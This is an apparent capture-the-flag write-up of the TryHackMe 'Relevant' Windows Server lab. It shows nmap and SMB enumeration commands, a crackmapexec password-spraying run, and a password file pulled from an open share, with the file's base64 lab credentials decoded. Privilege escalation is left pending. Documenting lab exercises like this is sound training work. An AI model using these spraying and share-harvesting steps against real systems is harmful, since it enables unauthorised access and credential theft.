# Penetration Test Summary: TryHackMe - Relevant

**Target IP:** 10.10.186.89
**Assessment Type:** Black-box Penetration Test
**Objective:** Obtain user.txt and root.txt flags
**OS Detected:** Windows Server 2016 Standard Evaluation (x64)


## Initial Reconnaissance

**Nmap Scan Command:**

```bash
sudo nmap 10.10.186.89
```

**Open Ports Identified:**

* 80/tcp – HTTP (IIS Web Server)
* 135/tcp – Microsoft RPC
* 139/tcp, 445/tcp – SMB/NetBIOS
* 3389/tcp – RDP (Network Level Authentication enabled)

Initial enumeration suggested a Windows Server environment with SMB and RDP as high-value targets. Port 80 hosted a default IIS web page with no obvious attack surface.


## SMB Enumeration & Weak Credential Discovery

**Anonymous SMB Access Attempt:**

```bash
smbmap -H 10.10.186.89
enum4linux -a 10.10.186.89
nmap --script smb-enum-users.nse -p445 10.10.186.89
```

**Result:** Anonymous enumeration restricted. No users or shares discovered.

---

## Credential Spraying (SMB)

**Tool Used:** crackmapexec

```bash
crackmapexec smb 10.10.186.89 -u users.txt -p top100.txt --continue-on-success
```

**Valid Credentials Found:**

```
Relevant\user
Relevant\admin
Relevant\test
Relevant\info
Relevant\adm
Relevant\mysql
Relevant\oracle
Relevant\ftp
Relevant\pi
Relevant\puppet
Relevant\ansible
Relevant\ec2-user
Relevant\vagrant
Relevant\azureuser
```


## Access to SMB Share: nt4wrksv

**SMB Share Enumeration:**

```bash
smbclient -L //10.10.186.89/ -U user
```

**Shares Accessible:**

* ADMIN\$ – Remote Admin (restricted)
* C\$ – Default drive (restricted)
* IPC\$ – Interprocess comms
* nt4wrksv – Custom share (accessible)

**Downloaded Credentials from Share:**

```bash
smbclient //10.10.186.89/nt4wrksv -U user
get passwords.txt
```

**Contents of passwords.txt:**

```
[User Passwords - Encoded]

Qm9iIC0gIVBAJCRXMHJEITEyMw== → Bob - !P@$W0rD!123  
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk → Bill - Juw4nnaM4n4206969!$$  
```

Password reuse or weak default credentials discovered.


## Valid SMB Access as User: bill

```bash
smbclient -L //10.10.186.89/ -U bill
```

**Access Granted To:**

* ADMIN\$, C\$ (listed, but restricted)
* nt4wrksv – accessible again with the same contents

Bill's credentials provided valid user-level access but did not grant elevated permissions.


## Summary

| Vector   | Result                          |
| -------- | ------------------------------- |
| SMB      | Credential reuse → valid logins |
| HTTP     | IIS default page only           |
| RDP      | Live with NLA enabled           |
| Priv Esc | Pending                         |
